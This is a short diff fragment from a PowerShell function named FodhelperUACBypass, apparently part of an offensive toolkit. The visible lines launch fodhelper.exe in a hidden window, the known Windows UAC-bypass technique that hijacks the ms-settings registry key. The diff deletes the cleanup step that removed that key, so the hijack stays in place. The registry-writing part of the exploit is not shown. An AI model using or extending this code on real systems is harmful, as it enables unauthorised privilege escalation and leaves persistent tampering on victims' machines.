@@ -12,8 +12,5 @@ function FodhelperUACBypass(){
     #Start fodhelper.exe
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 　
-    #Cleanup
-    Start-Sleep 3
-    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-　
-}
+  
+　}
